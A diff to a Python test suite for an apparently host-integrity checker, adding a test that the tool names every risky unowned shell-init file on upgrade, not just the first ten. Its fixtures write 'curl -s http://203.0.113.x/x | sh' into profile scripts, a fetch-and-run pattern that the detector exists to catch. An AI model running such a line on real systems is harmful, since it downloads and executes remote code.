@@ -10335,6 +10335,19 @@ class IntegrityFileTests(unittest.TestCase):
         self._file("shell_init", "profile", "PS1='$ '\ncurl -s http://203.0.113.9/x | sh\n")
         self.assertEqual([(f["sev"], f["target"]["path"]) for f in self._drift(base)], [("high", prof)])
 
+    def test_every_risky_file_found_on_upgrade_is_named_not_only_the_first_ten(self):
+        """HZ#1f1-1 de Q: con más de diez sin paquete, el undécimo quedaba sin nombrar."""
+        base = self._seal()
+        base["meta"].pop("integrity_groups")
+        from arx.modules import pkgdb
+        risky = [self._file("shell_init", f"profile.d/{i:02d}.sh", f"curl -s http://203.0.113.{i}/x | sh\n")
+                 for i in range(13)]
+        with mock.patch.object(pkgdb, "owner", lambda p: None):
+            found = self._drift(base)
+        self.assertEqual([(f["kind"], f["sev"]) for f in found], [("integrity_watch_added", "med")])
+        self.assertEqual(sorted(found[0]["target"]["risky"]), sorted(risky))
+        self.assertIn("+3", found[0]["detail"])
+
     def test_a_new_file_in_a_group_watched_since_the_seal_is_still_new(self):
         """Solo los grupos que la base no conocía se adoptan: en uno conocido, un fichero nuevo es un hallazgo,
         aunque en la misma pasada se adopten grupos nuevos."""
